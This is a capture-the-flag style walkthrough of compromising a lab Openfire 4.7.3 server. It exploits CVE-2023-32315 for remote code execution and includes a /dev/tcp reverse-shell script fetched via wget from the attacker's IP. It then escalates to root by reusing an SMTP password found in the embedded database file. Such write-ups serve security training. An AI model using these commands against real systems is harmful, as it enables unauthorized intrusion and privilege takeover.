##### Tags: `CVE-2023-32315`  `script`  `log`  `openfire`  `plugin`

# 🐧Fired🐧
## Enumeration
Nmap
```console
$ nmap -p- -T4 -sV 192.168.105.96            

PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
9090/tcp open  http     Jetty
9091/tcp open  ssl/http Jetty
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
port 9091 is a empty page  
port 9090 is running openfire 4.7.3  
we have no passwd for the page  
google found the version is CVE-2023-32315
```console
https://github.com/tangxiaofeng7/CVE-2023-32315-Openfire-Bypass?tab=readme-ov-file
```
follow the instruction and upload to shell plugin to operfire and use RCE   
for some reason, nc and python is not working in the RCE   
so i created a script  
```console
#!/bin/bash
/bin/sh -i >& /dev/tcp/192.168.45.166/22 0>&1
```
upload it to /tmp and execute
```console
wget http://192.168.45.166/shell.sh -O /tmp/shell.sh

bash /tmp/shell.sh
```
```console
openfire@openfire:/tmp$ id
uid=114(openfire) gid=118(openfire) groups=118(openfire)
```

## Privilege Escalation

i check the linpeas output found 
openfire has writable permission to some files
```console
╔══════════╣ Writable log files (logrotten) (limit 50)
Writable: /var/log/openfire/openfire.log
Writable: /var/lib/openfire/embedded-db/openfire.log
```
but the log has nothing interested  
however there is a file call openfire.script
```console
openfire@openfire:/var/lib/openfire/embedded-db$ ls -la

drwxr-x--- 3 openfire openfire  4096 Aug  5  2024 .
drwxr-x--- 4 openfire openfire  4096 Jun 28  2024 ..
-rw-r--r-- 1 openfire openfire    16 Feb 12 12:45 openfire.lck
-rw-r--r-- 1 openfire openfire  3483 Feb 12 11:51 openfire.log
-rw-r--r-- 1 openfire openfire   100 Aug  5  2024 openfire.properties
-rw-r--r-- 1 openfire openfire 16269 Aug  5  2024 openfire.script
drwxr-xr-x 2 openfire openfire  4096 Jun 28  2024 openfire.tmp
```
it has the password for smtp server
```console
openfire@openfire:/var/lib/openfire/embedded-db$ cat openfire.script

INSERT INTO OFPROPERTY VALUES('mail.smtp.host','localhost',0,NULL)
INSERT INTO OFPROPERTY VALUES('mail.smtp.password','OpenFireAtEveryone',0,NULL)
```
but smtp server is not running
```console
openfire@openfire:/$ netstat

tcp        0    133 openfire:58364          192.168.45.166:ssh      ESTABLISHED
tcp        0      0 openfire:47516          192.168.45.166:ssh      CLOSE_WAIT 
tcp        0      0 openfire:56948          192.168.45.166:ssh      CLOSE_WAIT 
tcp6       1      0 openfire:9090           192.168.45.166:36830    CLOSE_WAIT 
tcp6       0      0 openfire:9090           192.168.45.166:47432    ESTABLISHED
tcp6       1      0 openfire:9090           192.168.45.166:59856    CLOSE_WAIT 
tcp6       1      0 openfire:9090           192.168.45.166:39118    CLOSE_WAIT 

```
try the password with root and success
```console
openfire@openfire:/$ su root
Password: OpenFireAtEveryone

root@openfire:/# id
uid=0(root) gid=0(root) groups=0(root)
```
